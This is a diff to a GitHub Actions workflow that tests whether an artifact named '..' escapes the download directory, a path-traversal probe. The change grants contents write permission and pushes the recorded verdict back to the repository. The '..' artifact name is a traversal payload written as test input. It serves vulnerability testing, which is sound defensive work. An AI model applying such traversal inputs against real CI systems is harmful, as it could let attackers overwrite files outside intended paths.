@@ -1,8 +1,6 @@
 name: artifact-dotdot-runtime
 
 on:
-  pull_request:
-    branches: [main]
   push:
     branches: [main]
     paths:
@@ -10,13 +8,15 @@ on:
   workflow_dispatch:
 
 permissions:
-  contents: read
+  contents: write
   actions: read
 
 jobs:
   validate:
     runs-on: ubuntu-latest
     steps:
+      - uses: actions/checkout@v4
+
       - name: Prepare harmless payloads
         shell: bash
         run: |
@@ -26,12 +26,16 @@ jobs:
           printf 'dummy\n' > "$RUNNER_TEMP/payload-dummy/dummy.txt"
 
       - name: Upload artifact named dot-dot
+        id: dotdot
+        continue-on-error: true
         uses: actions/upload-artifact@v4
         with:
           name: '..'
           path: ${{ runner.temp }}/payload-dotdot/escape-marker.txt
 
       - name: Upload second artifact
+        id: dummy
+        continue-on-error: true
         uses: actions/upload-artifact@v4
         with:
           name: dummy-artifact
@@ -42,22 +46,48 @@ jobs:
         run: mkdir -p "$RUNNER_TEMP/artifact-root/child"
 
       - name: Download all artifacts
+        id: download
+        if: always()
+        continue-on-error: true
         uses: actions/download-artifact@v5
         with:
           path: ${{ runner.temp }}/artifact-root/child
 
-      - name: Validate destination-root escape
+      - name: Record verdict
+        if: always()
+        shell: bash
+        env:
+          DOTDOT_OUTCOME: ${{ steps.dotdot.outcome }}
+          DUMMY_OUTCOME: ${{ steps.dummy.outcome }}
+          DOWNLOAD_OUTCOME: ${{ steps.download.outcome }}
+        run: |
+          set -u
+          mkdir -p security-probe-results
+          marker_parent=false
+          marker_child=false
+          [[ -f "$RUNNER_TEMP/artifact-root/escape-marker.txt" ]] && marker_parent=true
+          [[ -f "$RUNNER_TEMP/artifact-root/child/../escape-marker.txt" ]] && marker_child=true
+          {
+            echo "run_id=$GITHUB_RUN_ID"
+            echo "dotdot_upload=$DOTDOT_OUTCOME"
+            echo "dummy_upload=$DUMMY_OUTCOME"
+            echo "download=$DOWNLOAD_OUTCOME"
+            echo "parent_marker=$marker_parent"
+            echo "child_tree_begin"
+            find "$RUNNER_TEMP/artifact-root/child" -maxdepth 4 -type f -printf '%p\n' 2>/dev/null || true
+            echo "child_tree_end"
+            echo "root_tree_begin"
+            find "$RUNNER_TEMP/artifact-root" -maxdepth 4 -type f -printf '%p\n' 2>/dev/null || true
+            echo "root_tree_end"
+          } > security-probe-results/artifact-dotdot.txt
+
+      - name: Commit verdict
+        if: always()
         shell: bash
         run: |
           set -euo pipefail
-          echo '--- expected child tree ---'
-          find "$RUNNER_TEMP/artifact-root/child" -maxdepth 3 -type f -print || true
-          echo '--- parent tree ---'
-          find "$RUNNER_TEMP/artifact-root" -maxdepth 3 -type f -print || true
-          if [[ -f "$RUNNER_TEMP/artifact-root/escape-marker.txt" ]]; then
-            echo 'VULNERABLE: artifact name .. escaped the configured download directory'
-            cat "$RUNNER_TEMP/artifact-root/escape-marker.txt"
-            exit 0
-          fi
-          echo 'NOT VULNERABLE: marker did not escape into parent directory'
-          exit 1
+          git config user.name 'github-actions[bot]'
+          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git add security-probe-results/artifact-dotdot.txt
+          git commit -m 'Record artifact dot-dot runtime verdict' || exit 0
+          git push
